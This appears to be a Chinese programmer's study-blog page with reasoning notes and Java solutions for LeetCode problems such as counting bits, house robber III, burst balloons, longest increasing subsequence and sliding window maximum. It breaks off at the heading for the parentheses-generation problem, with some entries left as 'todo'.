<p>todo</p>
<h3 id="338-比特位计数"><a href="#338-比特位计数" class="headerlink" title="338. 比特位计数"></a><a href="https://leetcode.cn/problems/counting-bits/">338. 比特位计数</a></h3><p>思路(最高有效位思路):</p>
<p>设最左边i对应的值为bitNum</p>
<p>dp[i] &#x3D; 1 + dp[i - bitNum]</p>
<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] countBits(<span class="type">int</span> n) &#123;</span><br><span class="line">        <span class="type">int</span>[] res = <span class="keyword">new</span> <span class="title class_">int</span>[n + <span class="number">1</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">bitNum</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(i &gt;= (bitNum &lt;&lt; <span class="number">1</span>)) bitNum &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">            res[i] = <span class="number">1</span> + res[i - bitNum];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>用最低有效位简单点bits[i] &#x3D; bits[i &gt;&gt; 1] + (i &amp; 1);</p>
<h3 id="337-打家劫舍-III"><a href="#337-打家劫舍-III" class="headerlink" title="337. 打家劫舍 III"></a><a href="https://leetcode.cn/problems/house-robber-iii/">337. 打家劫舍 III</a></h3><p>思路：经典数组变成链表题，把竖直的看成数组处理，dfs即可。前面思路不行，因为一个跟结点的选取会影响，两个子节点的选取。而前面方法做的话可能会冲突。因此需要记录结点是否被选取，递归进行处理</p>
<p>代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">ans</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    Map&lt;TreeNode, Integer&gt; record = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">rob</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        dfs(root, <span class="literal">false</span>);</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> <span class="title function_">dfs</span><span class="params">(TreeNode root,<span class="type">boolean</span> isSkip)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//isSkip为true说明上个结点被选了，直接跳过即可</span></span><br><span class="line">        <span class="keyword">if</span>(isSkip)&#123;</span><br><span class="line">            <span class="keyword">return</span> dfs(root.left, <span class="literal">false</span>) + dfs(root.right, <span class="literal">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//为ture说明能选，但其实最佳结果也有两种情况选该结点和不选该结点</span></span><br><span class="line">        <span class="comment">//选该结点</span></span><br><span class="line">        <span class="type">int</span> ans1;</span><br><span class="line">        <span class="keyword">if</span>(record.containsKey(root))&#123;</span><br><span class="line">            ans1 = record.get(root);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            ans1 = root.val + dfs(root.left, <span class="literal">true</span>) + dfs(root.right, <span class="literal">true</span>);</span><br><span class="line">            record.put(root, ans1);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//不选该结点</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">ans2</span> <span class="operator">=</span> dfs(root.left, <span class="literal">false</span>) + dfs(root.right, <span class="literal">false</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">retVal</span> <span class="operator">=</span> Integer.max(ans1, ans2);</span><br><span class="line">        ans = Integer.max(ans, retVal);</span><br><span class="line">        <span class="keyword">return</span> retVal;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>做复杂了，我这里把抢和不强分开了，其实可以简单看待，就后序遍历就行，避免复杂化</p>
<p>代码二</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">rob</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Arrays.stream(dfs(root)).max().getAsInt();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span>[] dfs(TreeNode root)&#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>) <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0</span>, <span class="number">0</span>&#125;;</span><br><span class="line">        <span class="type">int</span>[] left = dfs(root.left);</span><br><span class="line">        <span class="type">int</span>[] right = dfs(root.right);</span><br><span class="line">        <span class="type">int</span> <span class="variable">robCur</span> <span class="operator">=</span> root.val + left[<span class="number">1</span>] + right[<span class="number">1</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">notRobCur</span> <span class="operator">=</span> Integer.max(left[<span class="number">0</span>], left[<span class="number">1</span>]) + Integer.max(right[<span class="number">0</span>], right[<span class="number">1</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;robCur, notRobCur&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="121-买卖股票的最佳时机"><a href="#121-买卖股票的最佳时机" class="headerlink" title="121. 买卖股票的最佳时机"></a><a href="https://leetcode.cn/problems/best-time-to-buy-and-sell-stock/">121. 买卖股票的最佳时机</a></h3><p>思路：记录前面最小值即可</p>
<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxProfit</span><span class="params">(<span class="type">int</span>[] prices)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">minVal</span> <span class="operator">=</span> Integer.MAX_VALUE;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; prices.length; i++) &#123;</span><br><span class="line">            res = Integer.max(res, prices[i] - minVal);</span><br><span class="line">            minVal = Integer.min(minVal, prices[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="312-戳气球"><a href="#312-戳气球" class="headerlink" title="312. 戳气球"></a><a href="https://leetcode.cn/problems/burst-balloons/">312. 戳气球</a></h3><p>思路：肯定得动态规划。然后跟范围相关，应该得进行区间dp</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">定义dp[i][j]为在范围(i,j)范围内的硬币最大值（为什么开区间之后会说）。然后我们需要考虑状态转移，对应dp[i][j]如果我们要一个一个戳破气球，那么很麻烦，而且按我们的定义也不好进行状态转移。我们之间考虑，最后一个戳的气球的位置设为k，其他的中间值交给之前计算出来的值了。</span><br><span class="line">如果我们定义dp[i][j] 为闭区间[i,j]范围的硬币最大值，那么 如果我们戳的最后一个气球为k。状态转移为：</span><br><span class="line">dp[i][j] = dp[i][k - 1] + nums[i] * nums[k] * nums[j] + dp[k+1][j]，但如果i = j 或者 abs(i - j) &lt;= 1就不行了。</span><br><span class="line">如果定义为开区间的话</span><br><span class="line">dp[i][j] = dp[i][k] + nums[i] * nums[k] * nums[j] + dp[k][j] 要好很多。</span><br><span class="line">然后我们看转移顺序：一个点跟左边的点和下边的点相关，因此需要从左下遍历。然后我们是三重循环（需要遍历k）</span><br><span class="line">i &lt; </span><br></pre></td></tr></table></figure>

<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxCoins</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="type">int</span>[][] dp = <span class="keyword">new</span> <span class="title class_">int</span>[n + <span class="number">2</span>][n + <span class="number">2</span>];</span><br><span class="line">        <span class="type">int</span>[] arr = <span class="keyword">new</span> <span class="title class_">int</span>[n + <span class="number">2</span>];</span><br><span class="line">        arr[<span class="number">0</span>] = arr[n + <span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            arr[i + <span class="number">1</span>] = nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//dp[i][j] = dp[i][k] + nums[i] * nums[k] * nums[j] + dp[k][j]</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> <span class="number">3</span>; len &lt;= n + <span class="number">2</span>; len++)&#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> n + <span class="number">2</span> - len;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> left + <span class="number">2</span>; right &lt;= n + <span class="number">1</span>; right ++)&#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> left + <span class="number">1</span>; k &lt; right; k++)&#123;</span><br><span class="line">                    dp[left][right] = Integer.max(dp[left][right], dp[left][k] + arr[left] * arr[k] * arr[right] + dp[k][right]);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[<span class="number">0</span>][n + <span class="number">1</span>];   </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>调试了半天漏了个</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+ dp[k][right]</span><br></pre></td></tr></table></figure>

<h3 id="40题了"><a href="#40题了" class="headerlink" title="40题了"></a>40题了</h3><h3 id="309-买卖股票的最佳时机含冷冻期"><a href="#309-买卖股票的最佳时机含冷冻期" class="headerlink" title="309. 买卖股票的最佳时机含冷冻期"></a><a href="https://leetcode.cn/problems/best-time-to-buy-and-sell-stock-with-cooldown/">309. 买卖股票的最佳时机含冷冻期</a></h3><p>思路：动态规划，维护三个状态</p>
<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxProfit</span><span class="params">(<span class="type">int</span>[] prices)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> prices.length;</span><br><span class="line">        <span class="type">int</span>[][] dp = <span class="keyword">new</span> <span class="title class_">int</span>[n][<span class="number">3</span>];</span><br><span class="line">        <span class="comment">//0 买 1冷静 2卖出</span></span><br><span class="line">        dp[<span class="number">0</span>][<span class="number">0</span>] = -prices[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; n; i++) &#123;</span><br><span class="line">            dp[i][<span class="number">0</span>] = Integer.max(dp[i - <span class="number">1</span>][<span class="number">0</span>],  dp[i - <span class="number">1</span>][<span class="number">1</span>] - prices[i]);</span><br><span class="line">            dp[i][<span class="number">1</span>] = Integer.max(dp[i - <span class="number">1</span>][<span class="number">1</span>], dp[i - <span class="number">1</span>][<span class="number">2</span>]);</span><br><span class="line">            dp[i][<span class="number">2</span>] = Integer.max(dp[i - <span class="number">1</span>][<span class="number">2</span>], dp[i][<span class="number">0</span>] + prices[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n - <span class="number">1</span>][<span class="number">2</span>];        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>也可以用两个状态，修改下转移方程。</p>
<p>能空间优先，懒得优化了。</p>
<h3 id="301-删除无效的括号"><a href="#301-删除无效的括号" class="headerlink" title="301. 删除无效的括号"></a><a href="https://leetcode.cn/problems/remove-invalid-parentheses/">301. 删除无效的括号</a></h3><p>思路：设左括号a个，右边括号b个。如果有效至上得删除max(a,b) - min(a,b)个括号</p>
<p>todo</p>
<h3 id="300-最长递增子序列"><a href="#300-最长递增子序列" class="headerlink" title="300. 最长递增子序列"></a><a href="https://leetcode.cn/problems/longest-increasing-subsequence/">300. 最长递增子序列</a></h3><p>思路：动态规划,dp[i] &#x3D; 1 + dp[j] (nums[j] &lt; nums[i])，这样的话时间复杂度为n^2，想要nlogn。应该内层循环需要优化，看能不能二分。感觉不好二分啊。。。。。。</p>
<p>看了下题解，需要修改状态方程定义，定义为：dp[j]表示长度为j的子序列末尾值</p>
<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">lengthOfLIS</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="type">int</span>[] dp = <span class="keyword">new</span> <span class="title class_">int</span>[n + <span class="number">1</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        dp[<span class="number">0</span>] = -<span class="number">10001</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num : nums) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">l</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="type">int</span> <span class="variable">r</span> <span class="operator">=</span> res + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span> (l &lt; r)&#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">mid</span> <span class="operator">=</span> l + (r - l) / <span class="number">2</span>;<span class="comment">//l &lt;= mid &lt; r</span></span><br><span class="line">                <span class="keyword">if</span>(num &gt; dp[mid])&#123;</span><br><span class="line">                    l = mid + <span class="number">1</span>;</span><br><span class="line">                &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                    r = mid;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            dp[l] = num;</span><br><span class="line">            <span class="keyword">if</span>(r == res + <span class="number">1</span>) res++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="297-二叉树的序列化与反序列化"><a href="#297-二叉树的序列化与反序列化" class="headerlink" title="297. 二叉树的序列化与反序列化"></a><a href="https://leetcode.cn/problems/serialize-and-deserialize-binary-tree/">297. 二叉树的序列化与反序列化</a></h3><p>思路：分两种情况讨论。是否需要序列化null，如果需要序列化null。那么先序遍历保存恢复即可。不序列话null的话，需要额外信息才能恢复，可以加(l),(r)表示是根结点的左结点还是右结点。两种序列化反序列化方法都写下</p>
<p>代码一：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Codec</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="type">int</span> index;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">serialize</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        dfs(root);</span><br><span class="line">        result = result.trim();</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">void</span> <span class="title function_">dfs</span><span class="params">(TreeNode root)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>)&#123;</span><br><span class="line">            result += <span class="string">&quot;n &quot;</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        result += root.val + <span class="string">&quot; &quot;</span>;</span><br><span class="line">        dfs(root.left);</span><br><span class="line">        dfs(root.right);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Decodes your encoded data to tree.</span></span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">deserialize</span><span class="params">(String data)</span> &#123;</span><br><span class="line">        String[] strings = data.split(<span class="string">&quot; &quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> deserialize(strings);</span><br><span class="line">    &#125;</span><br><span class="line">    TreeNode <span class="title function_">deserialize</span><span class="params">(String[] strings)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(strings[index].equals(<span class="string">&quot;n&quot;</span>))&#123;</span><br><span class="line">            index++;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">TreeNode</span> <span class="variable">root</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TreeNode</span>(Integer.parseInt(strings[index]));</span><br><span class="line">        index++;</span><br><span class="line">        root.left = deserialize(strings);</span><br><span class="line">        root.right = deserialize(strings);</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最开始忘了初始化String了导致出现nulll1 这种格式了，以后注意这种初始化问题</p>
<h3 id="287-寻找重复数"><a href="#287-寻找重复数" class="headerlink" title="287. 寻找重复数"></a><a href="https://leetcode.cn/problems/find-the-duplicate-number/">287. 寻找重复数</a></h3><p>思路：不修改数组但我可以恢复回来啊。思路对于nums[i] ，增加nums[nums[i]] +&#x3D; n + 1。之后找增加了两次模运算恢复回来即可</p>
<p>代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">    public int findDuplicate(int[] nums) &#123;</span><br><span class="line">        int n = nums.length;</span><br><span class="line">        final int MOD_NUM = n + 1;</span><br><span class="line">        for (int num : nums) &#123;</span><br><span class="line">            int curNum = num % MOD_NUM;</span><br><span class="line">            nums[curNum] += MOD_NUM;</span><br><span class="line">        &#125;</span><br><span class="line">        int res = 0;</span><br><span class="line">        for (int i = 1; i &lt; n; i++) &#123;</span><br><span class="line">            if(nums[i] / MOD_NUM &gt;= 2) res = i;</span><br><span class="line">            nums[i] %= MOD_NUM;</span><br><span class="line">        &#125;</span><br><span class="line">        return res;        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>思路：快慢指针法（题解方法，还能有这种方法）</p>
<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">findDuplicate</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">slow</span> <span class="operator">=</span> nums[<span class="number">0</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">fast</span> <span class="operator">=</span> nums[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>)&#123;</span><br><span class="line">            slow = nums[slow];</span><br><span class="line">            fast = nums[nums[fast]];</span><br><span class="line">            <span class="keyword">if</span>(fast == slow) <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        fast = nums[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">while</span> (fast != slow)&#123;</span><br><span class="line">            fast = nums[fast];</span><br><span class="line">            slow = nums[slow];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> fast; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="283-移动零"><a href="#283-移动零" class="headerlink" title="283. 移动零"></a><a href="https://leetcode.cn/problems/move-zeroes/">283. 移动零</a></h3><p>思路： 快慢指针</p>
<p>代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">moveZeroes</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">slow</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">fast</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="keyword">while</span> (fast &lt; n)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[fast] != <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(fast != slow) &#123;</span><br><span class="line">                    nums[slow] = nums[fast];</span><br><span class="line">                    nums[fast] = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                slow++;</span><br><span class="line">            &#125;</span><br><span class="line">            fast++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="279-完全平方数"><a href="#279-完全平方数" class="headerlink" title="279. 完全平方数"></a><a href="https://leetcode.cn/problems/perfect-squares/">279. 完全平方数</a></h3><p>思路：动态规划</p>
<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">numSquares</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] dp = <span class="keyword">new</span> <span class="title class_">int</span>[n + <span class="number">1</span>];</span><br><span class="line">        Arrays.fill(dp, <span class="number">10000</span> + <span class="number">1</span>);</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">1</span>; j * j &lt;= i; j++)&#123;</span><br><span class="line">                dp[i] = Integer.min(dp[i], dp[i - j * j] + <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[n];        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>思路二：<a href="https://baike.baidu.com/item/%E5%9B%9B%E5%B9%B3%E6%96%B9%E5%92%8C%E5%AE%9A%E7%90%86">四平方和定理_百度百科</a></p>
<p>数学相关没通用性，有个数就行，代码不写了</p>
<h3 id="253-会议室-II-力扣（LeetCode）"><a href="#253-会议室-II-力扣（LeetCode）" class="headerlink" title="253. 会议室 II - 力扣（LeetCode）"></a><a href="https://leetcode.cn/problems/meeting-rooms-ii/description/?envType=problem-list-v2&envId=2cktkvj">253. 会议室 II - 力扣（LeetCode）</a></h3><p>需要会员</p>
<h3 id="240-搜索二维矩阵-II"><a href="#240-搜索二维矩阵-II" class="headerlink" title="240. 搜索二维矩阵 II"></a><a href="https://leetcode.cn/problems/search-a-2d-matrix-ii/">240. 搜索二维矩阵 II</a></h3><p>思路：二分。二分得目的是为了排除一部分非答案的集合，我们从四个角落考虑，发现左下角和右上角都可行，能够排除一部分答案</p>
<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">searchMatrix</span><span class="params">(<span class="type">int</span>[][] matrix, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> matrix.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> matrix[<span class="number">0</span>].length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> m - <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i &gt;= <span class="number">0</span> &amp;&amp; j &lt; n)&#123;</span><br><span class="line">            <span class="keyword">if</span>(matrix[i][j] &gt; target) i--;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(matrix[i][j] &lt; target) j++;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="239-滑动窗口最大值"><a href="#239-滑动窗口最大值" class="headerlink" title="239. 滑动窗口最大值"></a><a href="https://leetcode.cn/problems/sliding-window-maximum/">239. 滑动窗口最大值</a></h3><p>思路：单调队列。新进来的数比前面的数大的话，前面的数一定用不上了。</p>
<p>代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] maxSlidingWindow(<span class="type">int</span>[] nums, <span class="type">int</span> k) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums.length;</span><br><span class="line">        <span class="type">int</span>[] res = <span class="keyword">new</span> <span class="title class_">int</span>[n - k + <span class="number">1</span>];</span><br><span class="line">        Deque&lt;Integer&gt; queue = <span class="keyword">new</span> <span class="title class_">ArrayDeque</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; k; i++) &#123;</span><br><span class="line">            <span class="keyword">while</span> (!queue.isEmpty() &amp;&amp; nums[i] &gt; queue.getFirst())&#123;</span><br><span class="line">                queue.removeFirst();</span><br><span class="line">            &#125;</span><br><span class="line">            queue.addFirst(nums[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        res[<span class="number">0</span>] = queue.getLast();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> k; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(nums[i - k] == queue.getLast()) queue.removeLast();</span><br><span class="line">            <span class="keyword">while</span> (!queue.isEmpty() &amp;&amp; nums[i] &gt; queue.getFirst())&#123;</span><br><span class="line">                queue.removeFirst();</span><br><span class="line">            &#125;</span><br><span class="line">            queue.addFirst(nums[i]);</span><br><span class="line">            res[i - k + <span class="number">1</span>] = queue.getLast();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="50题了"><a href="#50题了" class="headerlink" title="50题了"></a>50题了</h3><h3 id="22-括号生成"><a href="#22-括号生成" class="headerlink" title="22. 括号生成"></a><a href="https://leetcode.cn/problems/generate-parentheses/">22. 括号生成</a></h3><p>思路：范围有限，暴力生成即可。左括号数一定要大于右括号数</p>
<p>代码：</p>
